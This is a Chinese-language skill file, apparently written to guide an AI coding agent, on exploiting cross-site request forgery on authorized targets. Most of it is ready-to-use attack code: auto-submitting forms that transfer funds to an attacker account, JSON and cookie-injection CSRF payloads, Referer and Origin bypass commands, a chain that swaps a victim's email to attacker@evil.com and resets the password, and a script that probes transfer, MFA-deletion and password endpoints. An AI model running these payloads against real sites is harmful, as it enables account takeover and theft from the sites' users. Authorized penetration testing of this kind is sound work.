---
name: 借刀杀人·祭
description: >-
 授权目标上 CSRF 利用：Token 缺失、弱验证（前缀/长度/可预测）、
 SameSite=None bypass、双重提交 Cookie 绕过、JSON CSRF、
 Referer 校验绕过、CSRF + XSS 组合链。
 如有 XSS 优先组合 xss-exploit。
---

> **方源**
> 人是万物之灵，蛊是天地真精。
> 今朝剑指叠云处，炼蛊炼人还炼天！

# CSRF 跨站请求伪造利用（Cursor Skill）

## 作业入口（先跑这个）

```bash
python3 炼蛊房/cors_csrf_probe.py csrf --url https://授权/ --case <案>
python3 炼蛊房/cors_csrf_probe.py csrf --url https://授权/ --post https://授权/api/profile --cookie 'sid=1' --case <案>
```

作业手法：`传承/借刀杀人.md`。改密/加款先问。下面长文当附录。

## 何时用

- 状态变更操作（转账、改密、改邮箱、添加管理员）只依赖 Cookie 鉴权
- CSRF Token 存在但验证逻辑有缺陷
- SameSite=None 且 Secure（仍可 CSRF）
- 发现 `X-CSRF-Token` 但服务端不校验值，只校验头存在
- Content-Type 为 `text/plain` 时绕过预检

---

## 1. 快速检测

```bash
# 检查关键接口是否有 CSRF 防护
# 步骤 1：抓一个正常 POST 请求
# 步骤 2：去掉 CSRF Token 参数，看是否还成功
# 步骤 3：伪造 Referer 或 Origin，看是否被拒绝

curl -s -X POST \
 -H "Cookie: session=<YOUR_SESSION>" \
 -H "Referer: https://evil.attacker.com" \
 -H "Origin: https://evil.attacker.com" \
 -d "action=change_email&email=attacker@evil.com" \
 https://目标/api/user/email
```

---

## 2. 经典 HTML 表单 CSRF PoC

```html
<!-- 攻击者页面：evil.com/csrf_poc.html -->
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
 <form action="https://目标.com/api/account/transfer" method="POST">
 <input type="hidden" name="amount" value="1000">
 <input type="hidden" name="to_account" value="attacker_account">
 <!-- 如果有 CSRF Token 但未验证：-->
 <input type="hidden" name="csrf_token" value="anything123">
 </form>
</body>
</html>
```

---

## 3. JSON CSRF（不依赖表单）

许多现代应用用 `Content-Type: application/json`，但预检策略不当时仍可利用：

```html
<!-- 方法1：text/plain 绕过预检 -->
<form action="https://目标.com/api/user/update" method="POST" enctype="text/plain">
 <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<!-- 发送的 body：{"email":"attacker@evil.com","ignore":"="} -->
<!-- 如果服务器宽松解析 JSON，可能生效 -->
```

```html
<!-- 方法2：fetch + CORS 宽松 -->
<script>
fetch("https://目标.com/api/user/update", {
 method: "POST",
 body: JSON.stringify({email: "attacker@evil.com"}),
 credentials: "include",
 mode: "no-cors" // 不需要读响应时用 no-cors
});
</script>
```

---

## 4. CSRF Token 绕过技巧

### 4.1 完全缺失 Token
直接尝试，最简单。

### 4.2 Token 只校验格式（长度/前缀）

```python
# 生成符合格式但随机值的 token
import random, string
fake_token = "csrf_" + ''.join(random.choices(string.hexdigits, k=32))
# 如果服务器只检查前缀或长度，假 token 就能通过
```

### 4.3 Token 绑定用户但不绑定 Session

```
# 登录 A 账号获取 Token_A
# 在伪造 B 账号请求时使用 Token_A
# 如果只验证 token 属于某用户，而非绑定当前 session → 绕过
```

### 4.4 CSRF Token 在 GET 参数里（可 Referer 泄露）

```javascript
// 如果页面 img/script 加载时会在 Referer 里带 CSRF token
// 攻击者页面：
<img src="https://evil.attacker.com/log?ref=REFERER_VALUE">
// 诱导受害者访问，浏览器发送 Referer 到攻击者服务器
```

### 4.5 双重提交 Cookie 绕过（需 XSS 或子域 Cookie 设置）

```javascript
// 如果站点用"Cookie 值 = 请求参数值"方式验证 CSRF
// 且 Cookie 可从子域设置（domain=.victim.com）
document.cookie = "csrf_token=attacker_value; domain=.victim.com; path=/";

// 然后发送：
fetch("https://victim.com/api/action", {
 method: "POST",
 credentials: "include",
 body: new URLSearchParams({csrf_token: "attacker_value"})
});
```

---

## 5. Referer/Origin 校验绕过

```bash
# 旧 Referer 策略：只检查 Referer 不为空或来自正确域

# 绕过1：删除 Referer 头（部分应用允许无 Referer）
curl -X POST -H "Cookie: session=X" --no-referer https://目标/api/action

# 绕过2：Referer 包含目标域名（路径欺骗）
# Referer: https://evil.attacker.com/https://victim.com/

# 绕过3：Origin 为 null（sandbox iframe）
curl -X POST -H "Cookie: session=X" -H "Origin: null" https://目标/api/action

# 绕过4：subdomain Referer
# Referer: https://victim.com.attacker.com/
```

---

## 6. SameSite Cookie 绕过

```
SameSite=Strict：同站请求才带 Cookie → 难绕过，需同站 XSS
SameSite=Lax：GET 的顶层导航带 Cookie → 可通过 GET 型 CSRF
SameSite=None + Secure：任何跨站请求都带 Cookie → 传统 CSRF 可用
```

**Lax 模式下的 GET CSRF：**

```html
<!-- 如果状态变更接口支持 GET（不应该，但有时有） -->
<a href="https://目标/api/user?action=delete&id=123">点击领取奖励</a>
<img src="https://目标/api/user?subscribe=newsletter&email=attacker@evil.com">

<!-- 顶层导航（window.location）在 Lax 下也带 Cookie -->
<script>window.location="https://目标/logout";</script>
```

---

## 7. CSRF + 账号接管组合链

```javascript
// 1. 改绑邮箱（通过 CSRF）
fetch("https://目标/api/user/email", {
 method: "POST",
 credentials: "include",
 body: new URLSearchParams({
 email: "attacker@evil.com"
 })
});

// 2. 触发密码重置（通过 CSRF，用新邮箱）
fetch("https://目标/api/password/reset", {
 method: "POST",
 credentials: "include",
 body: new URLSearchParams({
 email: "attacker@evil.com"
 })
});

// 3. 接收重置邮件，完成接管
```

---

## 8. 自动化测试

```bash
# CSRFTester（命令行）
python3 -c "
import httpx

# 测试关键端点：删除 CSRF Token 是否还能成功
TARGET = 'https://目标.com'
SESS = 'session=YOUR_SESSION_COOKIE'

endpoints = [
 ('POST', '/api/account/transfer', {'amount': '1', 'to': 'test'}),
 ('POST', '/api/user/email', {'email': 'csrf@test.com'}),
 ('DELETE', '/api/account/mfa', {}),
 ('POST', '/api/user/password', {'password': 'newpass123'}),
]

headers = {'Cookie': SESS, 'Origin': 'https://evil.attacker.com', 'Referer': 'https://evil.attacker.com/'}

for method, path, data in endpoints:
 r = httpx.request(method, TARGET + path, data=data, headers=headers)
 print(f'[{r.status_code}] {method} {path}')
"
```

---

## 9. 成功口径

| 级别 | 描述 |
|------|------|
| L1 | 确认接口无 CSRF Token 验证（删 Token 后仍返回成功） |
| L2 | PoC HTML 页面自动触发状态变更（改邮箱/转账/删数据） |
| L3 | CSRF + 账号接管链完整验证 |

---

## 10. 不要做

- 未授权对真实用户执行 CSRF 攻击
- 测试时使用真实金额转账
- 发送包含 CSRF 的钓鱼邮件给无辜用户

---

## 真源

- 手法：`传承/借刀杀人.md`
- 工具：`python3 炼蛊房/cors_csrf_probe.py csrf --help`
